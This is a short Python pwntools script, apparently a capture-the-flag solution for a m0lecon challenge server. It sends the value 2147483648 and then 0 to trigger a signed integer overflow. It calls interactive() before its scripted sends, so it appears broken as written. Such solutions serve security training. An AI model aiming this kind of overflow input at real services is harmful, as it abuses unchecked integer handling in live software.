#!/usr/bin/env python3
import os
os.environ['PWNLIB_NOTERM'] = 'True'
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *

HOST = "svtctf.m0lecon.it" 
PORT = 13453

def main():

    server = remote(HOST, PORT)
    server.interactive()
    server.recvuntil(b'Please, enter the first number: ')
    server.sendline(b'2147483648')  #first unsigned int, set to MAX of signed integer +1
    
    server.recvuntil(b'Now, enter the second number: ') #second unsigned
    server.sendline(b'0')

    # result in signed overflows -> neg number
    server.interactive()

if __name__ == '__main__':
    main()
